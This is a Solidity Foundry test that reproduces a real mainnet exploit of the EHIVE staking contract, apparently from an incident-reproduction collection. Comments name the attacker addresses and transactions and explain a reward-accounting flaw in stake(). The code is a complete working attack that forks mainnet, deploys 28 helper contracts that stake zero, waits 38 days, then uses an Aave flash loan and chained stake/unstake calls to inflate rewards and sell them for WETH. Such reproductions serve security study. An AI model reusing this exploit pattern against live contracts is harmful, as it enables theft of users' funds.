// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$15K
// Attacker : https://etherscan.io/address/0x0195448a9c4adeaf27002c6051c949f3c3234bb5
// Attacker Contract : https://etherscan.io/address/0x98c2e1e85f8bf737d9c1450dd26d4a4bf880b892
// Vulnerable Contract : https://etherscan.io/address/0x4ae2cd1f5b8806a973953b76f9ce6d5fab9cdcfd
// Attack Tx : https://etherscan.io/tx/0xad818ec910def08c70ac519ab0fffa084b4178014a91cd8aa2f882d972a511c1
// Preparation Tx: https://etherscan.io/tx/0xd9156f507c701a09d3312e1987383c7c882df50b3127e1adfd74d74052642114

// @Analysis
// https://twitter.com/bulu4477/status/1693636187485872583
// In the EHIVE contract, the function stake() incorrectly updates the 'staked' value before calculating 'earned'
// As a result, an attacker only needs to initially stake 0 value of EHIVE, wait for a period of time,
// and then stake a certain amount of EHIVE to earn a large amount of EHIVE. Subsequently, they can unstake and sell it for profit
// @Vulnerability code
// //Check user is registered as staker
//     if (isStaking(msg.sender, validator)) {
//         _stakers[msg.sender][validator].staked += stakeAmount;
//         _stakers[msg.sender][validator].earned += _userEarned(msg.sender, validator);
//         _stakers[msg.sender][validator].start = block.timestamp;
//     } else {
//         _stakers[msg.sender][validator] = Staker(msg.sender, block.timestamp, stakeAmount, 0);
//     }

interface IEHIVE is IERC20 {
    function stake(uint256 stakeAmount, uint256 validator) external;

    function unstake(uint256 validator) external;
}

interface IUnstake {
    function unstake(address _user) external;

    function stake(uint256 amount) external;
}

contract EHIVETest is Test {
    IERC20 private constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IEHIVE private constant EHIVE = IEHIVE(0x4Ae2Cd1F5B8806a973953B76f9Ce6d5FAB9cdcfd);
    IAaveFlashloan private constant AaveFlashloan = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    IUniswapV2Pair private constant EHIVE_WETH = IUniswapV2Pair(0xAE851769593AC6048D36BC123700649827659A82);
    address[28] public contractList;

    function setUp() public {
        // Start from the block when exploit contracts were deployed
        vm.createSelectFork("mainnet", 17_690_497);
        vm.label(address(WETH), "WETH");
        vm.label(address(EHIVE), "EHIVE");
        vm.label(address(AaveFlashloan), "AaveFlashloan");
        vm.label(address(EHIVE_WETH), "EHIVE_WETH");
    }

    function testExploit() public {
        // 1. Deploy exploit contract
        // 2. Call EHIVE stake function with amount 0
        for (uint256 i; i < contractList.length; ++i) {
            address deployedContract = address(new UnstakeContract());
            IUnstake(deployedContract).stake(0);
            contractList[i] = deployedContract;
        }
        // Jump to the time when attack was happen
        vm.warp(block.timestamp + 38 days);
        emit log_named_decimal_uint(
            "Attacker WETH balance before attack", WETH.balanceOf(address(this)), WETH.decimals()
        );
        WETH.approve(address(AaveFlashloan), type(uint256).max);
        AaveFlashloan.flashLoanSimple(address(this), address(WETH), 18e18, new bytes(1), 0);
        emit log_named_decimal_uint(
            "Attacker WETH balance after attack", WETH.balanceOf(address(this)), WETH.decimals()
        );
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        WETHToEHIVE();
        EHIVE.transfer(contractList[0], EHIVE.balanceOf(address(this)));
        // Start exploit
        for (uint256 i; i < 27; ++i) {
            IUnstake(contractList[i]).unstake(contractList[i + 1]);
        }
        IUnstake(contractList[27]).unstake(address(this));
        // End exploit
        EHIVEToWETH();
        return true;
    }

    function WETHToEHIVE() internal {
        (uint112 reserveEHIVE, uint112 reserveWETH,) = EHIVE_WETH.getReserves();
        uint256 amount0Out = calcAmount(reserveEHIVE, reserveWETH, WETH.balanceOf(address(this)));

        WETH.transfer(address(EHIVE_WETH), WETH.balanceOf(address(this)));
        EHIVE_WETH.swap(amount0Out, 0, address(this), bytes(""));
    }

    function EHIVEToWETH() internal {
        (uint112 reserveEHIVE, uint112 reserveWETH,) = EHIVE_WETH.getReserves();
        EHIVE.transfer(address(EHIVE_WETH), EHIVE.balanceOf(address(this)));
        uint256 amount1Out = calcAmount(reserveWETH, reserveEHIVE, EHIVE.balanceOf(address(EHIVE_WETH)) - reserveEHIVE);
        EHIVE_WETH.swap(0, amount1Out - 100, address(this), bytes(""));
    }

    function calcAmount(uint256 reserve1, uint256 reserve2, uint256 balance) internal returns (uint256) {
        uint256 a = (balance * 997);
        uint256 b = a * reserve1;
        uint256 c = (reserve2 * 1000) + a;
        return b / c;
    }
}

contract UnstakeContract is Test {
    IEHIVE private constant EHIVE = IEHIVE(0x4Ae2Cd1F5B8806a973953B76f9Ce6d5FAB9cdcfd);

    function stake(uint256 amount) external {
        EHIVE.stake(amount, 0);
    }

    function unstake(address _user) external {
        EHIVE.stake(EHIVE.balanceOf(address(this)), 0);
        EHIVE.unstake(0);
        EHIVE.transfer(_user, EHIVE.balanceOf(address(this)));
    }
}
